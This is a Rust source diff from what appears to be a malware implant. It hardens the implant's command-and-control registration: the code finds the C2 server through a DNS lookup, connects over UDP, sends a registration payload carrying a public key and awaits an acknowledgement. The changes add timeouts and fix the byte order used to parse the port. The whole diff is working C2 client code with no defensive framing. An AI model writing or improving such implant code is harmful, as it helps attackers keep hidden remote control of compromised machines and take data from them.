@@ -10,6 +10,7 @@ use crate::{
 use hickory_resolver::Resolver;
 use std::net::Ipv4Addr;
 use tokio::net::UdpSocket;
+use tokio::time::{timeout, Duration};
 
 mod errors;
 mod types;
@@ -47,8 +48,9 @@ async fn register_self_udp(
     let sock = UdpSocket::bind("0.0.0.0:0")
         .await
         .map_err(|err| RegistrationError::Connection(err))?;
-    sock.connect(remote_addr)
+    timeout(Duration::from_secs(10), sock.connect(remote_addr))
         .await
+        .map_err(|_| RegistrationError::Timeout("Timed out connecting to c2 udp".into()))?
         .map_err(|err| RegistrationError::Connection(err))?;
 
     let mut reg_buf: Vec<u8> = Vec::new();
@@ -80,10 +82,16 @@ async fn register_self_udp(
     reg_buf.extend_from_slice(&public_key_len.to_be_bytes());
     reg_buf.extend_from_slice(&public_key);
 
-    sock.send(&reg_buf).await.map_err(|err| RegistrationError::Communication(err))?;
+    timeout(Duration::from_secs(10), sock.send(&reg_buf))
+        .await
+        .map_err(|_| RegistrationError::Timeout("Timed out sending registration payload".into()))?
+        .map_err(|err| RegistrationError::Communication(err))?;
 
     let mut ack_buf = [0u8; 16];
-    let bytes_received = sock.recv(&mut ack_buf).await.map_err(|err| RegistrationError::Communication(err))?;
+    let bytes_received = timeout(Duration::from_secs(10), sock.recv(&mut ack_buf))
+        .await
+        .map_err(|_| RegistrationError::Timeout("Timed out waiting for registration ack".into()))?
+        .map_err(|err| RegistrationError::Communication(err))?;
     
     if bytes_received == 0 {
         return Err(RegistrationError::ServerSilence);
@@ -156,7 +164,7 @@ async fn find_c2_dns() -> Result<ReachInfo, DnsReachError> {
 
     Ok(ReachInfo {
         ipv4: Ipv4Addr::new(bytes[0], bytes[1], bytes[2], bytes[3]),
-        port: u16::from_ne_bytes([bytes[4], bytes[5]]),
+        port: u16::from_be_bytes([bytes[4], bytes[5]]),
         comm_mode: match bytes[6] {
             0x00 => ReachCommMode::HTTP,
             0x01 => ReachCommMode::UDP,
